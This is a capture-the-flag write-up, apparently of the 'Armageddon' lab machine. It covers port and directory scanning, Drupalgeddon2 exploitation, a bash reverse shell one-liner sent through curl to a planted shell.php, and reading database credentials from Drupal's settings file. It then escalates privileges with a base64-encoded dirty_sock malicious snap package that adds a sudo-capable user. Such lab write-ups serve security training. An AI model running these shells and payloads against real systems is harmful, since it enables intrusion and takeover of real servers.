# Armageddon Writeup


## Enumeration

#### Port Scanning

```nmap -p 22,80 -sV -T4 10.129.48.89
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-17 09:10 UTC
Nmap scan report for 10.129.48.89
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
```

#### Directory Fuzzing

```gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.48.89/ -x html,php,txt,aspx,sh -t 15 -k -o dirBruteInitial
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.48.89/
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              aspx,sh,html,php,txt
[+] Timeout:                 10s
===============================================================
2021/11/17 09:11:51 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 7440]
/misc                 (Status: 301) [Size: 233] [--> http://10.129.48.89/misc/]
/themes               (Status: 301) [Size: 235] [--> http://10.129.48.89/themes/]
/modules              (Status: 301) [Size: 236] [--> http://10.129.48.89/modules/]
/scripts              (Status: 301) [Size: 236] [--> http://10.129.48.89/scripts/]
/sites                (Status: 301) [Size: 234] [--> http://10.129.48.89/sites/]  
/includes             (Status: 301) [Size: 237] [--> http://10.129.48.89/includes/]
/install.php          (Status: 200) [Size: 3172]                                   
/profiles             (Status: 301) [Size: 237] [--> http://10.129.48.89/profiles/]
/update.php           (Status: 403) [Size: 4057]                                   
/README.txt           (Status: 200) [Size: 5382]                                   
/robots.txt           (Status: 200) [Size: 2189]                                   
/INSTALL.txt          (Status: 200) [Size: 17995]                                  
/cron.php             (Status: 403) [Size: 7388]                                   
/LICENSE.txt          (Status: 200) [Size: 18092]                                  
Progress: 43260 / 1323366 (3.27%)                               
```


## Initial Access

Found many references to Drupal. 

Used [drupalgeddon2.rb](https://github.com/dreadlocked/Drupalgeddon2.git) to get a php shell. 
Improved shell: 
`curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.16.131/443 0>&1" 'http://10.129.48.89/shell.php'`

Found hardcoded MySql creds in /var/www/html/sites/default/settings.php:

```
array (
      'database' => 'drupal',
      'username' => '<Redacted>',
      'password' => '<Redacted>',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
```

Used these credentials to run commands on the SQL server. 
`mysql -u <Redacted> -p <Redacted> -e 'use drupal; select * from users;'`

Found a username and password hash that I cracked and could ssh in with. 

## Privelege Escalation


sudo -l
```
[<Redacted>@armageddon ~]$ sudo -l
Matching Defaults entries for <Redacted> on armageddon:
    !visiblepw, always_set_home, match_group_by_gid,
    always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User <Redacted> may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Used this payload from [this exploit](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) to create a malicious snap package:

`python -c "print('aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw''' + 'A' * 4256 + '==')" | base64 -d > xct`

Then install the package:

```sudo snap install `pwd`/xct --dangerous --devmode```

Then I su'd to dirty_sock:dirty_sock

